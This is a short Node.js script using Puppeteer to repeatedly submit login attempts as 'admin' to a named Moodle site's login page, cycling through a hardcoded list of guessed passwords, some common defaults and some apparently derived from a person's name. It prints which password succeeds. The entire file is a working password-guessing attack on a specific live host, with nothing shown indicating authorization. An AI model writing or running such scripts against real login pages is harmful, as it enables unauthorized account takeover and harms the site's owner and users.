const puppeteer = require('puppeteer');

const passwords = [
    'moodle', 'sandbox', 'admin', 'password', 'raspberry', 'rasppi', 'andrevmp', 
    'andrevictor', 'andrevictor20', 'test', '123456', 'Moodle2024!', 'P@ssword1',
    'Admin123!', 'Moodle123!', 'Admin@123'
];

(async () => {
    const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
    const page = await browser.newPage();
    
    for (const pass of passwords) {
        await page.goto('https://moodle.rasppi.cloud/login/index.php', { waitUntil: 'domcontentloaded' });
        await page.type('#username', 'admin');
        await page.type('#password', pass);
        
        const navPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => {});
        await page.click('#loginbtn');
        await navPromise;
        
        const title = await page.title();
        if (title.toLowerCase().includes('painel') || title.toLowerCase().includes('dashboard')) {
            console.log(`[SUCCESS] admin / ${pass}`);
            break;
        } else {
            console.log(`[FAILED] admin / ${pass} -> ${title}`);
        }
    }
    
    await browser.close();
})();
